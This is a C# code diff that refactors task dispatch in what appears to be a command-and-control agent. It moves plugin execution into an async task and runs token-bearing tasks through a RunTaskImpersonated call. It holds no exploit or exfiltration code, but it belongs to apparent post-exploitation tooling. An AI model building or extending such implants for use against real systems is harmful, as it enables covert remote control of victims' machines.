@@ -56,36 +56,46 @@ namespace Agent.Managers
                     }
                     break;
                 default:
-                    IPlugin plug;
-                    if(!this.assemblyManager.TryGetPlugin(job.task.command, out plug))
+                    _ = Task.Run(async () =>
                     {
-                        await this.messageManager.AddResponse(new ResponseResult()
+                        if (!this.assemblyManager.TryGetPlugin(job.task.command, out IPlugin plug))
                         {
-                            task_id = job.task.id,
-                            process_response = new Dictionary<string, string> { { "message", "0x11" } },
-                            status = "error",
-                            completed = true,
-                        });
-                        break;
-                    }
+                            await this.messageManager.AddResponse(new ResponseResult()
+                            {
+                                task_id = job.task.id,
+                                process_response = new Dictionary<string, string> { { "message", "0x11" } },
+                                status = "error",
+                                completed = true,
+                            });
+                            return;
+                        }
 
-                    _ = Task.Run(() =>
-                    {
+                        if(job.task.token == 0)
+                        {
+                            try
+                            {
+                                await plug.Execute(job);
+                            }
+                            catch (Exception e)
+                            {
+                                await this.messageManager.AddResponse(new ResponseResult()
+                                {
+                                    task_id = job.task.id,
+                                    user_output = e.ToString(),
+                                    status = "error",
+                                    completed = true,
+                                });
+                            }
+                            return;
+                        }
+
                         try
                         {
-                            if(job.task.token != 0)
-                            {
-                                tokenManager.RunTaskImpersonated(plug, job);
-                            }
-                            else
-                            {
-                                plug.Execute(job);
-                            }
-
+                            tokenManager.RunTaskImpersonated(plug, job);
                         }
                         catch (Exception e)
                         {
-                            this.messageManager.AddResponse(new ResponseResult()
+                            await this.messageManager.AddResponse(new ResponseResult()
                             {
                                 task_id = job.task.id,
                                 user_output = e.ToString(),
@@ -93,6 +103,7 @@ namespace Agent.Managers
                                 completed = true,
                             });
                         }
+                        return;
                     });
                             
                     break;
